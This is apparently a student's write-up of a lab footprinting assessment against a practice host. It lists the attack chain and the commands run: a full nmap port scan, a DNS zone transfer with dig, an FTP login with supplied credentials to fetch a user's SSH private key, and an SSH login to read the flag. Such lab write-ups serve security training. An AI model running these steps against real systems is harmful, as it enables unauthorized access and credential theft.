## Footprinting Skills Assessment — Easy (internal DNS server)

Given: creds `ceil:qwer1234`, hint "employees talking about SSH keys on a forum". Goal: read `flag.txt`.

## Attack chain
1. **Port scan** — host blocks ping (`-Pn`); the non-standard **2121** only shows in a full `-p-` scan.
2. **DNS zone transfer** — dump the internal domain + subdomains.
3. **FTP banners** leak hostnames → port **2121 = "Ceil's FTP"**, rooted at ceil's **home dir**.
4. **Login to 2121** with `ceil:qwer1234` → grab `.ssh/id_rsa`.
5. **SSH in** with the key → find and read the flag.

## Commands I actually ran
```bash
# 1. ports (ping blocked, full range)
nmap -Pn -p- --min-rate 2000 <TARGET>          # 21,22,53,2121
nmap -Pn -sV -p21,22,53,2121 <TARGET>

# 2. DNS zone transfer (got the internal domain from the FTP banner too)
dig @<TARGET> axfr inlanefreight.htb            # SOA, NS, app/internal/mail/ns subdomains

# 3. FTP: anonymous fails; ceil works on 2121 ("Ceil's FTP")
ftp -inv <TARGET> 2121
  > user ceil qwer1234
  > ls -la                                      # home dir -> .ssh present
  > get .ssh/id_rsa id_rsa                       # full path; active mode worked when passive hung

# 4. SSH in with the key, locate flag
chmod 600 id_rsa
ssh -i id_rsa ceil@<TARGET>
  $ find / -name flag.txt 2>/dev/null            # -> /home/flag/flag.txt
```

## Notes to self
- **Always full `-p-`** — the win (2121) was off the common-ports list.
- **Service banners are free intel** — "Ceil's FTP" named the port holding the keys; another banner leaked `ftp.int.inlanefreight.htb`.
- Zone transfer = `dig @<ip> axfr <domain>`; get the domain from SOA/banners if unknown.
- FTP rooted at a user's home → go straight for `.ssh/id_rsa`.
- If passive FTP data transfer hangs over the VPN, the `ftp` client falling back to **active/EPRT** worked; fetch by full path (`get .ssh/id_rsa`).
- SSH key auth then `find / -name flag.txt 2>/dev/null`.
